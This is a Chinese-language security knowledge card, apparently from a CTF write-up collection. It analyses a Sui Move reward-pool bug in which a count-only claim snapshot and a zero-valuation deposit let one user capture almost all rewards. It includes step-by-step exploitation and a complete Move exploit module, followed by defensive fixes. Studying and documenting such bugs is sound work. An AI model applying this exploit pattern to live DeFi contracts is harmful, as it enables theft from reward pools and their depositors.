---
id: blockchain-move-reward-snapshot-count-zero-evaluation-deposit
title: Move 奖励池快照只记人数 + 零估值存款绕过阶段检查：替换高份额用户压低 total_evaluation，领走全部奖励
type: scenario
domain: blockchain
path: blockchain/move
technique: move-reward-claim-snapshot-count-zero-evaluation-bypass
tags:
- blockchain
- move
- sui
- defi
- reward-pool
- snapshot
- oracle
- logic-bug
- accounting
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T07:04:03+08:00'
  notes: 已对照原文hot_potato_finance全文核对：claim_start只记pool.deposits.length()、claim_complete只断言total_deposits==processed_users.size()、claim_step接受任意当前存款人；deposit_for仅在evaluation>0时断言Stage::Depositing，REWARD_COIN无oracle报价可零估值插入；两轮exp（先claim再deposit REWARD_COIN+claim_step+claim_complete）与原文一致，rewards>2000置is_solved；修复方案与原文一致
url: /docs/blockchain/move/blockchain-move-reward-snapshot-count-zero-evaluation-deposit/
draft: false
kb_aliases:
- hot_potato_finance
- 奖励快照人数
- 零估值存款
- deposit_for 阶段绕过
- total_evaluation 操纵
- ClaimingPotato 人数校验
---

## 一句话结论

Sui Move 奖励池的 `claim_start` 只把当前存款人数 `pool.deposits.length()` 存进 `ClaimingPotato`，`claim_step` 又接受任何当前存款人；而 `deposit_for` 只在 `evaluation > 0` 时才检查 `stage == Depositing`。攻击者在 claim 过程中存入一枚 oracle 无报价、估值为 0 的新币，插入一个新用户并用它完成 `claim_step`，即可绕过“人数相等”校验且不处理高份额老用户，使 `total_evaluation` 只剩攻击者自己的估值，奖励份额接近 100%，领走超过阈值的奖励。

## 原理

- **快照只存数量不存身份**：`claim_start` 记录 `total_deposits = pool.deposits.length()`；`claim_complete` 只断言 `potato.total_deposits == potato.processed_users.size()`。也就是说，只要处理的人数对得上，处理的是“谁”完全不重要。
- **claim_step 接受任意现有存款人**：`claim_step(pool, user, oracle, potato)` 只要求 `pool.users.contains(&user)`、`pool.deposits.contains(user)`、`user != potato.user` 且未被处理过；不要求该 user 在 claim_start 时就已经存在。
- **零估值存款绕过阶段检查**：`deposit_for` 的阶段断言写在 `if (evaluation > 0) { assert!(pool.stage == Stage::Depositing); }` 里。若存入的币在 `PriceOracle` 中没有价格（例如奖励币本身），`evaluate()` 返回 0，阶段检查被跳过，因此可以在 `Stage::Claiming` 期间新增存款人。
- **份额公式被污染**：`claim_complete` 用 `rewards_amount = pool.rewards * deposit_evaluation / total_evaluation * amount / deposit_amount`。`total_evaluation` 只累加 `claim_step` 处理过的用户估值；把零估值新用户塞进 processed 集合、跳过高份额老用户后，分母只剩攻击者自己的 `deposit_evaluation`，分子分母相同，攻击者拿到 100% 份额（受 `amount/deposit_amount` 限制），单次领取即可超过 `REWARD_AMOUNT_TO_SOLVE`。
- **人数校验为何仍通过**：快照是 claim_start 时的旧人数（例如 1），攻击者之后新增用户不改变快照；用新用户完成一次 `claim_step`，processed 人数正好等于旧快照人数，断言通过。
- **根因**：快照用“数量”代替“身份集合”，阶段检查被估值条件短路，奖励分母使用可被挑选的 processed 集合。

## 触发条件

- 奖励池实现 `claim_start`/`claim_step`/`claim_complete` 三段式领取，且快照只记录人数。
- 价格 oracle 对至少一种可存入的 Coin 返回 0 估值（奖励币、非白名单币、无喂价币）。
- `deposit_for` 的阶段检查被 `evaluation > 0` 包住，零估值存款可在 Claiming 阶段执行。
- `claim_complete` 的奖励按 `deposit_evaluation / total_evaluation` 分配，且 `is_solved` 只检查单次 `rewards_amount` 是否超过阈值。

## 利用步骤

1. 确认池已进入 Claiming 阶段（`allow_claiming` 已被调用），且 oracle 对奖励币 `REWARD_COIN` 无报价。
2. 第一轮领取：`claim_start(amount1)` 记录当前人数，`claim_step` 处理老用户，`claim_complete` 拿到一部分奖励币（用于下一步当“零估值存款”）。
3. 第二轮 `claim_start(amount2)`：快照人数为上一轮结束后的存款人数。
4. 选择一个新地址 `attack_user`，调用 `pool.deposit_for<REWARD_COIN, REWARD_COIN>(attack_user, rewards, oracle)`；`evaluate` 对 REWARD_COIN 返回 0，阶段检查被跳过，attack_user 成为新存款人。
5. 调用 `claim_step(attack_user)`，其估值为 0，只把 0 累加到 `total_evaluation`；由于快照是旧人数，processed 人数正好达标，无需处理高份额老用户。
6. `claim_complete` 计算份额时分母只剩攻击者自己的估值，`rewards_amount` 超过阈值，`pool.is_solved = true`，领走奖励。
7. 把领到的 `rewards` 与 `claimed` 转回攻击者地址。

## PoC

原文 exp（Move）：

```move
module the_solution::solution;

use challenge::challenge::Challenge;
use challenge::deposit_coin::DEPOSIT_COIN;
use challenge::reward_coin::REWARD_COIN;

#[allow(lint(self_transfer))]
public fun solve(
    challenge: &mut Challenge<REWARD_COIN, DEPOSIT_COIN>,
    ctx: &mut TxContext,
) {
    challenge.emulate_deposit(ctx);
    let (pool, oracle) = challenge.get_pool_and_oracle();

    let mut potato = pool.claim_start<REWARD_COIN, DEPOSIT_COIN>(100, oracle, ctx);
    let admin_user = pool.get_user(0);
    pool.claim_step<REWARD_COIN, DEPOSIT_COIN>(admin_user, oracle, &mut potato);
    let (rewards, claimed) = pool.claim_complete<REWARD_COIN, DEPOSIT_COIN>(potato, ctx);
    transfer::public_transfer(claimed, ctx.sender());

    potato = pool.claim_start<REWARD_COIN, DEPOSIT_COIN>(900, oracle, ctx);
    let attack_user = @0xb9139896a3190bf688ffe8732b82a9136238f57426b35d2857fbd44c1ef65590;
    pool.deposit_for<REWARD_COIN, REWARD_COIN>(attack_user, rewards, oracle);
    pool.claim_step<REWARD_COIN, REWARD_COIN>(attack_user, oracle, &mut potato);
    let (new_rewards, new_claimed) = pool.claim_complete<REWARD_COIN, DEPOSIT_COIN>(potato, ctx);
    transfer::public_transfer(new_claimed, ctx.sender());
    transfer::public_transfer(new_rewards, ctx.sender());
}
```

关键点：第二轮存入的是 `REWARD_COIN` 本身，oracle 对它估值为 0，从而绕过 `Stage::Claiming` 的阶段检查；`claim_step` 只处理这个零估值新用户，`total_evaluation` 不再包含 admin 的高份额。

## 变体与关联

- 零估值来源变体：奖励币无喂价、未上架币、任意伪造 Coin 类型、oracle 过期/返回 0、 decimals 换算为 0。
- 快照错配变体：claim_start 与 claim_complete 之间用户被删除/新增；快照地址集合与实际 processed 集合不一致。
- 份额操纵变体：先降低 `total_evaluation` 再放大 `amount/deposit_amount`；多账号分拆领取。
- 关联卡片：[[blockchain-move-vault-ptb-atomicity-cross-vault]]（跨对象/PTB 组合）、[[blockchain-move-amm-swap-pre-reserve-rounding-drain]]（份额/取整计算）、[[blockchain-move-staking-admincap-unbound-overflow-lock]]（同文章的另一个 Move 逻辑缺陷）。
- 边界：本案在 CTF 中通过 `is_solved` 单次奖励阈值；真实 DeFi 中同一模式可造成奖励池被单一方领空，具体数额取决于池余额与份额公式。

## 检测与防御

- 快照存身份集合：`claim_start` 把当时的 `pool.users`/deposits key 集合完整快照到 `ClaimingPotato`，`claim_step` 只允许处理快照内用户，`claim_complete` 断言 processed 集合与快照集合完全一致（而非只比数量）。
- 无条件阶段检查：`deposit_for` 在任何估值下都断言 `pool.stage == Stage::Depositing`；Claiming 阶段禁止新增存款人。
- 拒绝零估值：Claiming/结算阶段拒绝 `evaluation == 0` 的存款，或要求存款币在 oracle 白名单内且有有效价格。
- 分母一致性：奖励分母使用快照时的 total_evaluation 或从快照集合重新计算，不使用调用者可挑选的 processed 集合。
- 测试：覆盖“领取期间插入零估值用户”“删除用户后人数不变”“oracle 返回 0”三类边界；对奖励份额做守恒校验（Σ rewards <= pool.rewards）。
